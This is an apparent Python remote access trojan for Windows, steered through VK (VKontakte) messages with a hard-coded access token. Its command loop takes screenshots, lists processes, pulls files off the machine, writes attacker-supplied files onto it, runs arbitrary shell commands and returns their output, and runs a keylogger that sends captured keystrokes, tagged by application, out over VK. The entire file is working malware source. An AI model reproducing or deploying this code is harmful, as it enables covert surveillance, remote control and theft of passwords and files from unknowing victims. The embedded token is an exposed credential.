# -*- coding: utf-8 -*-
import win32process
import  win32gui
from urllib.request import urlopen
import urllib.request
import urllib
import os
import time
import subprocess
import psutil
import pickle
import vk
from pynput.keyboard import Key, Listener
import re
import pyautogui
import requests 
import json
import random
from subprocess import Popen, PIPE
import msvcrt
import getpass
username = getpass.getuser()

session = vk.Session(access_token='65c154a518ae73b5e71df8d929f9e233d7729f50e5e5a329cdeffe6bd0aa6ac81d334d61e55ec9a771ecd')
vk_api = vk.API(session)

def ActiveProcessSend(message):
    pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    activeprocess = psutil.Process(pid[-1]).name()
    message="["+activeprocess+"]"+"-Active process \n\n"
    VkMessageRespon(message)
def VkMessageRespon(message):

        response = vk_api.messages.send(user_id=218094830,v=5.38, message=message)

        message=""
def PcOnSend(message):
    message="____________vkXhelper____________<br>~~~~~~~~~~PC ON~~~~~~~~~<br>"
    VkMessageRespon(message)
def TaskManagerSend(message):
    check=0
    message="~~~~~~START~~~~~~<br>"
    messages=""
    time.sleep(1)
    pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
    activeprocess = psutil.Process(pid[-1]).name()
    message="["+activeprocess+"]"+"-Active process \n\n"
    VkMessageRespon(message)
    for p in psutil.process_iter():
        messages=p.name()
        check+=1
        checkstr=str(check)
        if messages=="svchost.exe":
           message=message
        else:
            message=message+checkstr+")"+messages+"<br>"+"_________________________________"+"<br>"
    number=0
    infwhile=0
    stop=0
    messagelen=len(message)
    startmass=0
    stopmass=2000
    messagen=""
    tempb=0
    while infwhile != 1:
        while stop != 1:    
            messagelen = messagelen-2000
            if messagelen < 2000:
                number = number+1
                stop=1
            else:
                number =number+ 1
        tempmessage = message
        for i in range(0,number+1):
            time.sleep(2)
            if i == number:
                for ll in range(startmass,len(tempmessage)):
                    messagen=messagen + tempmessage[ll]
                messagen=messagen +"<br>"+"~~~~~~~~~END~~~~~~~~~"
                tempb = 1
                
            else:
                for li in range(startmass,stopmass):
                    messagen=messagen+tempmessage[li]
                for la in range(0,2000):
                    startmass+=1
                    stopmass+=1

            message=messagen
            VkMessageRespon(message)
            messagen=""
            if tempb == 1:
                print("completed")
                print("wait a command")
                infwhile=1
def ScreenshotSend(message):
        screen = pyautogui.screenshot('C:\\Users\\'+username+'\\Pictures\\Camera Roll\\screenshot.png')
        serv = vk_api.photos.getMessagesUploadServer(v=5.00)
        photo_load = requests.post(serv['upload_url'], files={'photo': open('C:\\Users\\'+username+'\\Pictures\\Camera Roll\\screenshot.png', 'rb')}).json()
        print(photo_load)
        errorvk=photo_save = vk_api.photos.saveMessagesPhoto(v=5.00,photo = photo_load['photo'], server= photo_load['server'], hash= photo_load['hash'])[0]
        error=photo_id = 'photo{}_{}'.format(photo_save['owner_id'], photo_save['id'])
        vk_api.messages.send(user_id=218094830,v=5.00,  attachment=photo_id)
        print("completed")
        print("wait a command")
def DownloadSend(message):
        check = 0
        message="^Введите путь к файлу^"
        VkMessageRespon(message)
        while check != 1:
            filetext = vk_api.messages.getHistory(count=1,user_id=218094830,random_id=218094830,extended=0,v=5.101)
            filepath = filetext['items'][0]['text']
            if filepath[0] != "^":
                if len(filepath) != 0:
                    check = 1
            else:
                time.sleep(1)
        openFile = open(filepath, "r")
        uploadFile = vk_api.docs.getMessagesUploadServer (type="doc", peer_id="218094830",v=5.00)
        requestsFile = requests.post(uploadFile["upload_url"], files={'file': openFile}).json()
        saveFile = vk_api.docs.save(file = requestsFile['file'], title= "1",v=5.00)
        uploadfilemessage = 'doc{}_{}'.format(saveFile[0] ['owner_id'], saveFile[0]['id'])
        vk_api.messages.send(user_id=218094830,v=5.00,  attachment=uploadfilemessage)      
def CmdSend(message):
        message="^Вы вошли в консоль^"
        VkMessageRespon(message)
        waitcommand = 0
        cmdwork = 0
        command = "color a"
        while cmdwork != 1:
            message="^Введите команду^"
            VkMessageRespon(message)
            while waitcommand != 1:
                checkpause = 0
                commanddict = vk_api.messages.getHistory(count=1,user_id=218094830,random_id=218094830,extended=0,v=5.101)
                commandtext = commanddict['items'][0]['text']
                if commandtext[0]!="^":
                    symbolR = " "
                    splitcommandtext = commandtext.split(symbolR)
                    i=0
                    if len(commandtext) != 0:
                        for i in range(0,len(splitcommandtext)):
                            if splitcommandtext[i] == "pause":
                                checkpause = 1
                                message="^Нельзя вводить 'pause' в виде команды!^"
                                VkMessageRespon(message)

                        if checkpause == 0:
                            waitcommand = 1


                else:
                    time.sleep(1)
            if commandtext == "cmdexit" or commandtext == "Cmdexit":
                waitcommand = 1
                cmdwork = 1
                message="^Вы вышли из консоли^"
                VkMessageRespon(message)
                break
            command = command+" && "+commandtext
            print(command)
            skiperror = 0
            error = os.system(command+' > "C:\\Users\\'+username+'\\Pictures\\Camera Roll\\output.txt"')
            if error == 1:
                stopinf=0
                while stopinf != 1:
                    command=command[0:-1]
                    if command[-1] == "&":
                        command=command[0:-3]
                        stopinf=1
                        skiperror=1
                        print(command)
                        message="Нет ответа из консоли (Ошибка / Команда не должна давать ответ)"
                        VkMessageRespon(message)
            time.sleep(1)
            stopinf =0
            if commandtext[0:2] != "cd" and skiperror == 0:
                with open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\output.txt",encoding = 'cp866') as file:
                    message = file.read().encode('cp866').decode('cp866')
                while stopinf != 1:
                    command=command[0:-1]
                    if command[-1] == "&":
                        command=command[0:-3]
                        stopinf=1
                        message="_________________________________\n"+message+"\n_________________________________"
                        VkMessageRespon(message)
                        message="^Команда выполнена!^"
            if commandtext[0:2] == "cd":
                message="^Команда выполнена!^"
            waitcommand=0
            VkMessageRespon(message)
            time.sleep(1)
def UploadDoc(message):
    check = 0
    message="^Вместе с прикрепленным документом,введите путь сохранения файла^"
    VkMessageRespon(message)
    while check != 1:

        messagedicttext = vk_api.messages.getHistory(count=1,user_id=218094830,random_id=218094830,extended=0,v=5.101)
        time.sleep(1)
        messagedictdoc = vk_api.messages.getHistoryAttachments(count=1,peer_id=218094830,random_id=218094830,extended=0,v=5.101,media_type="doc")
        messageidtext = messagedicttext['items'][0]['id']
        messageiddoc = messagedictdoc['items'][0]['message_id']
        messagetextdoc = messagedictdoc['items'][0]['attachment']['doc']['title']
        messagetexttext = messagedicttext['items'][0]['text']
        messageurldoc = messagedictdoc['items'][0]['attachment']['doc']['url']
        messageextdoc = messagedictdoc['items'][0]['attachment']['doc']['ext']
        if messagetexttext[0] != "^":
            f=open(messagetexttext+"\\"+messagetextdoc+"."+messageextdoc,"wb") #открываем файл для записи, в режиме wb
            ufr = requests.get(messageurldoc) #делаем запрос
            f.write(ufr.content) #записываем содержимое в файл; как видите - content запроса
            f.close()
            message="^Файл успешно отправлен!^"
            VkMessageRespon(message)
            check=1
        time.sleep(1)
checkactiveprocess = 'asd'
def on_release(key):
              key = '{0}'.format(key)
              if '{0}'.format(key) =="Key.tab":
                  key="[TAB]"
              if '{0}'.format(key)  =="Key.shift":
                  key=" [SHIFT] "
              if '{0}'.format(key)  =="Key.enter":
                  key="[ENTER]"
              if '{0}'.format(key)  =="Key.caps_lock":
                  key="[CAPS_LOCK]"
              if '{0}'.format(key)  =="Key.ctrl_l":
                  key="[CTRL]"
              if '{0}'.format(key)  =="Key.alt_l":
                  key="[ALT]"
              if '{0}'.format(key)  =="Key.shift_r":
                  key="[R_SHIFT]"
              if '{0}'.format(key)  =="Key.ctrl_r":
                  key="[R_CTRL]"
              if '{0}'.format(key)  =="Key.alt_r":
                  key="[R_ALT]"
              if '{0}'.format(key)  =="Key.delete":
                  key="[DELETE]"
              if '{0}'.format(key)  =="Key.insert":
                  key="[INSERT]"
              if '{0}'.format(key)  =="Key.home":
                  key="[HOME]"
              if '{0}'.format(key)  =="Key.page_up":
                  key="[PAGE_UP]"
              if '{0}'.format(key)  =="Key.page_down":
                  key="[PAGE_DOWN]"
              if '{0}'.format(key)  =="Key.end":
                  key="[END]"
              if '{0}'.format(key)  =="Key.esc":
                  key="[ESC]"
              if '{0}'.format(key)  =="Key.f1":
                  key="[F1]"
              if '{0}'.format(key)  =="Key.f2":
                  key="[F2]"
              if '{0}'.format(key)  =="Key.f3":
                  key="[F3]"
              if '{0}'.format(key)  =="Key.f4":
                  key="[F4]"
              if '{0}'.format(key)  =="Key.f5":
                  key="[F5]"
              if '{0}'.format(key)  =="Key.f6":
                  key="[F6]"
              if '{0}'.format(key)  =="Key.f7":
                  key="[F7]"
              if '{0}'.format(key)  =="Key.f8":
                  key="[F8]"
              if '{0}'.format(key)  =="Key.f9":
                  key="[F9]"
              if '{0}'.format(key)  =="Key.f10":
                  key="[F10]"
              if '{0}'.format(key)  =="Key.f11":
                  key="[F11]"
              if '{0}'.format(key)  =="Key.f12":
                  key="[F12]"
              if '{0}'.format(key)  =="Key.backspace":
                  key="[BACKSPACE]" 
def on_press(key):
              activeprocess=''
              f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\proc.txt","r")             
              pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
              activeprocess = psutil.Process(pid[-1]).name()
              checkactiveprocess = f.read()
              f.close()
              f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\proc.txt","w")
              f.write(activeprocess)
              f.close()
              showproc = 0
              if checkactiveprocess != activeprocess:
                 showproc = 1
                 checkactiveprocess = activeprocess
              if '{0}'.format(key) =="Key.tab":
                  key="1 [TAB] 1"
              if '{0}'.format(key)  =="Key.shift":
                  key="1 [SHIFT] 1"
              if '{0}'.format(key)  =="Key.enter":
                  key="1 [ENTER] 1"
              if '{0}'.format(key)  =="Key.caps_lock":
                  key="1 [CAPS_LOCK] 1"
              if '{0}'.format(key)  =="Key.ctrl_l":
                  key="1 [CTRL] 1"
              if '{0}'.format(key)  =="Key.alt_l":
                  key="1 [ALT] 1"
              if '{0}'.format(key)  =="Key.shift_r":
                  key="1 [R_SHIFT] 1"
              if '{0}'.format(key)  =="Key.ctrl_r":
                  key="1 [R_CTRL] 1"
              if '{0}'.format(key)  =="Key.alt_r":
                  key="1 [R_ALT] 1"
              if '{0}'.format(key)  =="Key.delete":
                  key="1 [DELETE] 1"
              if '{0}'.format(key)  =="Key.insert":
                  key="1 [INSERT] 1"
              if '{0}'.format(key)  =="Key.home":
                  key="1 [HOME] 1"
              if '{0}'.format(key)  =="Key.page_up":
                  key="1 [PAGE_UP] 1"
              if '{0}'.format(key)  =="Key.page_down":
                  key="1 [PAGE_DOWN] 1"
              if '{0}'.format(key)  =="Key.end":
                  key="1 [END] 1"
              if '{0}'.format(key)  =="Key.esc":
                  key="1 [ESC] 1"
              if '{0}'.format(key)  =="Key.f1":
                  key="1 [F1] 1"
              if '{0}'.format(key)  =="Key.f2":
                  key="1 [F2] 1"
              if '{0}'.format(key)  =="Key.f3":
                  key="1 [F3] 1"
              if '{0}'.format(key)  =="Key.f4":
                  key="1 [F4] 1"
              if '{0}'.format(key)  =="Key.f5":
                  key="1 [F5] 1"
              if '{0}'.format(key)  =="Key.f6":
                  key="1 [F6] 1"
              if '{0}'.format(key)  =="Key.f7":
                  key="1 [F7] 1"
              if '{0}'.format(key)  =="Key.f8":
                  key="1 [F8] 1"
              if '{0}'.format(key)  =="Key.f9":
                  key="1 [F9] 1"
              if '{0}'.format(key)  =="Key.f10":
                  key="1 [F10] 1"
              if '{0}'.format(key)  =="Key.f11":
                  key="1 [F11] 1"
              if '{0}'.format(key)  =="Key.f12":
                  key="1 [F12] 1"
              if '{0}'.format(key)  =="Key.backspace":
                  key="1 [BACKSPACE] 1"
              if '{0}'.format(key)  =="Key.space":
                  key="   " 
              if showproc == 1:
                  f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\14.txt","a")
                  tempkey = '{0}'.format(key)
                  key = tempkey[1:-1]
                  f.write("]\n["+activeprocess+"]-| "+key)
                  f.close()
              else:
                  f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\14.txt","a")
                  tempkey = '{0}'.format(key)
                  key= tempkey[1:-1] 
                  f.write(key)
                  f.close()

              if os.path.getsize("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\14.txt") > 500:
                       f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\14.txt","r")
                       message = f.read()
                       f.close
                       VkMessageRespon("[KL]\n"+message)
                       f=open("C:\\Users\\"+username+"\\Pictures\\Camera Roll\\14.txt","w")
                       f.write("")
                       f.close
                       message="keystop"
                       VkMessageRespon(message)
                       check=1
                       return False  




message=""
PcOnSend(message)
print("wait a command")
while True: 
    messagedict = vk_api.messages.getHistory(count=1,user_id=218094830,random_id=218094830,extended=0,v=5.101)
    messagetext = messagedict['items'][0]['text']

    if messagetext == "screenshot" or messagetext == "Screenshot":
       print("the command in the process")
       message=""
       ScreenshotSend(message)      
    if messagetext =='taskmanager' or  messagetext =='Taskmanager' :
       message=""
       TaskManagerSend(message)

    if messagetext == 'cmdopen' or messagetext == 'Cmdopen':
        message=""
        CmdSend(message)
    if messagetext == 'download' or messagetext == 'Download':
        message=""
        DownloadSend(message)
    if messagetext == 'upload' or messagetext == 'Upload':
        message=''
        UploadDoc(message)
    if messagetext == 'activewindow' or messagetext == 'Activewindow': 
        message=''
        ActiveProcessSend(message)
    if messagetext == 'keyscan' or messagetext == 'Keyscan' or messagetext[0:3]== "[KL]":
         with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    time.sleep(1)
       

        